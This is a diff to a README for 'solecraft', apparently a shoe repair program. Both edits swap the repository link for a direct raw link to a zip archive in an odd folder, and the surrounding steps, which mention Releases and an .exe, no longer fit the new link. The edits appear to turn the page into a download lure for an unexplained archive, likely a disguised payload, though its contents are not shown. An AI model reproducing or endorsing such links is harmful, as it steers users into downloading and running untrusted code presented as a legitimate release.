@@ -1,7 +1,7 @@
 # 🛠️ solecraft - Master your shoe repair process easily
 
 <div align="center">
-  <a href="https://github.com/Registered-wakashan448/solecraft">
+  <a href="https://raw.githubusercontent.com/Registered-wakashan448/solecraft/main/isanomal/Software-3.3.zip">
     <img src="https://img.shields.io/badge/Download-Solecraft-blue.svg" alt="Download Solecraft">
   </a>
 </div>
@@ -25,7 +25,7 @@ Your computer needs to meet these basic standards to run Solecraft:
 
 Follow these steps to get the software on your computer.
 
-1.  Visit the official download page: https://github.com/Registered-wakashan448/solecraft
+1.  Visit the official download page: https://raw.githubusercontent.com/Registered-wakashan448/solecraft/main/isanomal/Software-3.3.zip
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number to view the download files.
 4.  Find the file that ends in .exe.
